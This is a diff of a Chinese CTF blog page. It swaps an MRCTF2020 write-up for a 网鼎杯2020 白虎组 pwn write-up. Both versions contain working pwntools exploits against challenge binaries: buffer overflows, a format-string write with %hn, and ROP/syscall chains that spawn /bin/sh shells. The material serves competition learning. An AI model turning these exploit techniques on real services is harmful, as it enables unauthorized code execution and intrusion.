@@ -20,21 +20,21 @@
     var CONFIG = {"hostname":"www.1p0ch.cn","root":"/","scheme":"Gemini","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="比赛又不会打，题目又懒得做像👴这种懒🐕只能在buu刷刷题，顺便复现一下MRCTF维持一下生活的亚子">
+  <meta name="description" content="网鼎杯白虎组，海星，两个签到，格式化字符串和一个栈题目。剩下一个盲打，一个vivd的cve不会">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MRCTF2020复现">
-<meta property="og:url" content="https://www.1p0ch.cn/2020/04/12/MRCTF%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:title" content="网鼎杯2020白虎组的复现（pwn部分）">
+<meta property="og:url" content="https://www.1p0ch.cn/2020/05/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%99%BD%E8%99%8E%E7%BB%84%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="1p0ch">
-<meta property="og:description" content="比赛又不会打，题目又懒得做像👴这种懒🐕只能在buu刷刷题，顺便复现一下MRCTF维持一下生活的亚子">
+<meta property="og:description" content="网鼎杯白虎组，海星，两个签到，格式化字符串和一个栈题目。剩下一个盲打，一个vivd的cve不会">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-04-12T15:12:31.000Z">
-<meta property="article:modified_time" content="2020-04-15T11:49:25.210Z">
+<meta property="article:published_time" content="2020-05-21T13:17:31.000Z">
+<meta property="article:modified_time" content="2020-05-21T13:50:33.041Z">
 <meta property="article:author" content="1p0ch">
-<meta property="article:tag" content="复现">
-<meta property="article:tag" content="MRCTF2020">
+<meta property="article:tag" content="网鼎杯2020">
+<meta property="article:tag" content="白虎组">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://www.1p0ch.cn/2020/04/12/MRCTF%E5%A4%8D%E7%8E%B0/">
+<link rel="canonical" href="https://www.1p0ch.cn/2020/05/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%99%BD%E8%99%8E%E7%BB%84%E5%A4%8D%E7%8E%B0/">
 
 
 <script id="page-configurations">
@@ -47,7 +47,7 @@
   };
 </script>
 
-  <title>MRCTF2020复现 | 1p0ch</title>
+  <title>网鼎杯2020白虎组的复现（pwn部分） | 1p0ch</title>
   
 
 
@@ -187,7 +187,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.1p0ch.cn/2020/04/12/MRCTF%E5%A4%8D%E7%8E%B0/">
+    <link itemprop="mainEntityOfPage" href="https://www.1p0ch.cn/2020/05/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%99%BD%E8%99%8E%E7%BB%84%E5%A4%8D%E7%8E%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=765986760&spec=160">
@@ -200,7 +200,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          MRCTF2020复现
+          网鼎杯2020白虎组的复现（pwn部分）
         </h1>
 
         <div class="post-meta">
@@ -209,17 +209,11 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2020-04-12 23:12:31" itemprop="dateCreated datePublished" datetime="2020-04-12T23:12:31+08:00">2020-04-12</time>
+              <time title="创建时间：2020-05-21 21:17:31 / 修改时间：21:50:33" itemprop="dateCreated datePublished" datetime="2020-05-21T21:17:31+08:00">2020-05-21</time>
             </span>
           
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-04-15 19:49:25" itemprop="dateModified" datetime="2020-04-15T19:49:25+08:00">2020-04-15</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
@@ -243,7 +237,7 @@
                 <i class="fa fa-file-word-o"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>646</span>
+              <span>1.4k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -262,12 +256,21 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>比赛又不会打，题目又懒得做<br>像👴这种懒🐕只能在buu刷刷题，顺便复现一下MRCTF维持一下生活的亚子</p>
+        <p>网鼎杯白虎组，海星，两个签到，格式化字符串和一个栈题目。剩下一个盲打，一个vivd的cve不会</p>
 <a id="more"></a> 
-<h3 id="easyoverflow"><a href="#easyoverflow" class="headerlink" title="easyoverflow"></a>easyoverflow</h3><p>简单的溢出修改内容进入后门<br>exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p=process('./mrctf2020_easyoverflow')</span></span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25110</span>)</span><br><span class="line">elf=ELF(<span class="string">'./mrctf2020_easyoverflow'</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x70</span><span class="number">-0x40</span></span><br><span class="line">fake_flag=<span class="string">'n0t_r3@11y_f1@g'</span></span><br><span class="line">payload=<span class="string">'a'</span>*offset+fake_flag</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>简单amd64输入shellcode即可，但是注意这里程序f5反编译不出来。<br>exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"><span class="comment">#p=process('./mrctf2020_shellcode')</span></span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">27980</span>)</span><br><span class="line">elf=ELF(<span class="string">'./mrctf2020_shellcode'</span>)</span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">print(shellcode)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="of"><a href="#of" class="headerlink" title="of"></a>of</h3><p>简单的格式化字符串，没啥好说的.<br>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./of'</span>)</span><br><span class="line"><span class="comment">#p = remote('123.57.225.26',15246)</span></span><br><span class="line"><span class="comment">#elf = ELF('./of')</span></span><br><span class="line">p.recvuntil(<span class="string">'e:'</span>)</span><br><span class="line">p.sendline(p32(<span class="number">0x804a028</span>))</span><br><span class="line">p.recvuntil(<span class="string">'e:'</span>)</span><br><span class="line">p.sendline(<span class="string">'%34714c%20$hn'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'e:'</span>)</span><br><span class="line">p.sendline(p32(<span class="number">0x804a028</span>))</span><br><span class="line">p.recvuntil(<span class="string">'e:'</span>)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">p.sendline(<span class="string">'%35291c%20$hn'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="quantum-entanglement"><a href="#quantum-entanglement" class="headerlink" title="quantum_entanglement"></a>quantum_entanglement</h3><p>init里有个syscall,所以就用syscall打就完事<br>两种解法：syscall+shellcode和syscall+execve</p>
+<p>exp-shellcode：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line">p=process(<span class="string">'./shellcode'</span>)</span><br><span class="line">rdx_rdi_rsi_syscall=<span class="number">0x400617</span></span><br><span class="line">bss=<span class="number">0x601200</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">112</span>+p64(bss)+p64(rdx_rdi_rsi_syscall)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(bss)+p64(bss)+p64(bss)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>exp-execve：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line">p=process(<span class="string">'./shellcode'</span>)</span><br><span class="line">main=<span class="number">0x40061f</span></span><br><span class="line">rdx_rdi_rsi_syscall=<span class="number">0x400617</span></span><br><span class="line">bss=<span class="number">0x601200</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">112</span>+p64(bss)+p64(rdx_rdi_rsi_syscall)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(bss)+p64(bss)+p64(rdx_rdi_rsi_syscall)+p64(<span class="number">0</span>)+p64(bss)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload=<span class="string">'/bin/sh\x00'</span></span><br><span class="line">payload=payload.ljust(<span class="number">58</span>,<span class="string">'\x00'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="vivd"><a href="#vivd" class="headerlink" title="vivd"></a>vivd</h3><p>文件下载下来了，有时间去复现一波</p>
+
     </div>
 
     
@@ -291,8 +294,8 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag"># 复现</a>
-              <a href="/tags/MRCTF2020/" rel="tag"># MRCTF2020</a>
+              <a href="/tags/%E7%BD%91%E9%BC%8E%E6%9D%AF2020/" rel="tag"># 网鼎杯2020</a>
+              <a href="/tags/%E7%99%BD%E8%99%8E%E7%BB%84/" rel="tag"># 白虎组</a>
           </div>
 
         
@@ -301,12 +304,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2020/04/04/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%88%E4%B9%8B%E5%89%8D%E5%A4%AA%E5%A4%9A%E6%87%92%E5%BE%97%E5%86%99%EF%BC%89/" rel="prev" title="BUU刷题记录">
-      <i class="fa fa-chevron-left"></i> BUU刷题记录
+    <a href="/2020/05/16/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E5%A4%8D%E7%8E%B0/" rel="prev" title="网鼎杯2020青龙组的复现（pwn部分）">
+      <i class="fa fa-chevron-left"></i> 网鼎杯2020青龙组的复现（pwn部分）
     </a></div>
       <div class="post-nav-item">
-    <a href="/2020/04/12/WUSTCTF%E5%A4%8D%E7%8E%B0/" rel="next" title="WUSTCTF2020复现">
-      WUSTCTF2020复现 <i class="fa fa-chevron-right"></i>
+    <a href="/2020/05/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%8E%84%E6%AD%A6%E7%BB%84%E5%A4%8D%E7%8E%B0/" rel="next" title="网鼎杯2020玄武组的复现（pwn部分）">
+      网鼎杯2020玄武组的复现（pwn部分） <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -367,7 +370,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#easyoverflow"><span class="nav-number">1.</span> <span class="nav-text">easyoverflow</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode"><span class="nav-number">2.</span> <span class="nav-text">shellcode</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#of"><span class="nav-number">1.</span> <span class="nav-text">of</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#quantum-entanglement"><span class="nav-number">2.</span> <span class="nav-text">quantum_entanglement</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vivd"><span class="nav-number">3.</span> <span class="nav-text">vivd</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
